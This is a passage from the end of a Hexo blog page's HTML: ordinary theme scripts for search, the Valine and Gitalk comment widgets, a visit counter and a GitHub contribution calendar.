href="#post-comment" title="Scroll To Comments"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div id="algolia-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Algolia</span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="search-wrap"><div id="algolia-search-input"></div><hr/><div id="algolia-search-results"><div id="algolia-hits"></div><div id="algolia-pagination"></div><div id="algolia-stats"></div></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><script src="https://cdn.jsdelivr.net/npm/algoliasearch@4/dist/algoliasearch-lite.umd.js"></script><script src="https://cdn.jsdelivr.net/npm/instantsearch.js@4/dist/instantsearch.production.min.js"></script><script src="/js/search/algolia.js"></script><div class="js-pjax"><script>function loadValine () {
  function initValine () {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: 'A1yHizbt6njivw1xL89dRlHw-gzGzoHsz',
      appKey: 'dUsAYDyF0DqEAvpSTG3sioz6',
      avatar: 'monsterid',
      serverURLs: '',
      emojiMaps: "",
      path: window.location.pathname,
      visitor: false
    }, null))
  }

  if (typeof Valine === 'function') initValine() 
  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
}

if ('Valine' === 'Valine' || !false) {
  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
  else setTimeout(loadValine, 0)
} else {
  function loadOtherComment () {
    loadValine()
  }
}</script><script>function addGitalkSource () {
  const ele = document.createElement('link')
  ele.rel = 'stylesheet'
  ele.href= 'https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.css'
  document.getElementsByTagName('head')[0].appendChild(ele)
}

function loadGitalk () {
  function initGitalk () {
    var gitalk = new Gitalk(Object.assign({
      clientID: '',
      clientSecret: '',
      repo: '',
      owner: '',
      admin: [''],
      id: '38d0165f4c7a1a4145e2b5fe4562c83a',
      updateCountCallback: commentCount
    },null))

    gitalk.render('gitalk-container')
  }

  if (typeof Gitalk === 'function') initGitalk()
  else {
    addGitalkSource()
    getScript('https://cdn.jsdelivr.net/npm/gitalk@latest/dist/gitalk.min.js').then(initGitalk)
  }
}

function commentCount(n){
  let isCommentCount = document.querySelector('#post-meta .gitalk-comment-count')
  if (isCommentCount) {
    isCommentCount.innerHTML= n
  }
}

if ('Valine' === 'Gitalk' || !false) {
  if (false) btf.loadComment(document.getElementById('gitalk-container'), loadGitalk)
  else loadGitalk()
} else {
  function loadOtherComment () {
    loadGitalk()
  }
}</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><!-- hexo injector body_end start --><script data-pjax src="https://npm.elemecdn.com/hexo-filter-gitcalendar/lib/gitcalendar.js"></script><script data-pjax>
  function gitcalendar_injector_config(){
      var parent_div_git = document.getElementById('recent-posts');
      var item_html = '<div class="recent-post-item" style="width:100%;height:auto;padding:10px;"><style>#git_container{min-height: 280px}@media screen and (max-width:650px) {#git_container{min-height: 0px}}</style><div id="git_loading" style="width:10%;height:100%;margin:0 auto;display: block;"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 50 50" style="enable-background:new 0 0 50 50" xml:space="preserve"><path fill="#d0d0d0" d="M25.251,6.461c-10.318,0-18.683,8.365-18.683,18.683h4.068c0-8.071,6.543-14.615,14.615-14.615V6.461z" transform="rotate(275.098 25 25)"><animatetransform attributeType="xml" attributeName="transform" type="rotate" from="0 25 25" to="360 25 25" dur="0.6s" repeatCount="indefinite"></animatetransform></path></svg><style>#git_container{display: none;}</style></div><div id="git_container"></div></div>';
      parent_div_git.insertAdjacentHTML("afterbegin",item_html)
      console.log('已挂载gitcalendar')
      }

    if( document.getElementById('recent-posts') && (location.pathname ==='/'|| '/' ==='all')){
        gitcalendar_injector_config()
        GitCalendarInit("https://gitcalendar.akilar.top/api?ckcah",['#ebedf0', '#f1f8ff', '#dbedff', '#c8e1ff', '#79b8ff', '#2188ff', '#0366d6', '#005cc5', '#044289', '#032f62', '#05264c'],'ckcah')
    }
  </script><!-- hexo injector body_end end --></body></html>